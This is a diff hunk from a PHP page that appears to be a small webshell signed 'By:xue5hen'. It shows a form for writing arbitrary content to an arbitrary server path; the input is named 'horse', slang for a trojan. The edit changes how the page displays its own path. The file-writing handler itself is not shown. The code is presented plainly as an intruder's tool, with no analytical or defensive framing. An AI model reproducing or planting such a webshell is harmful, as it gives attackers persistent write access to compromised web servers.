@@ -9,7 +9,7 @@
 ?>
 <title>By:xue5hen</title>
 <form action="" method="post">
-	<p>当前路径：<?php echo __FILE__?></p>
+	<p>当前路径：<?php echo $_SERVER["SCRIPT_FILENAME"]?></p>
 	<p>写入路径：<input type="text" name="horse" size="70"></p>
 	<p>写入内容：<textarea name="content" rows="18" cols="72"></textarea></p>
 	<p><input type="submit" name="submit" value="保存"></p>
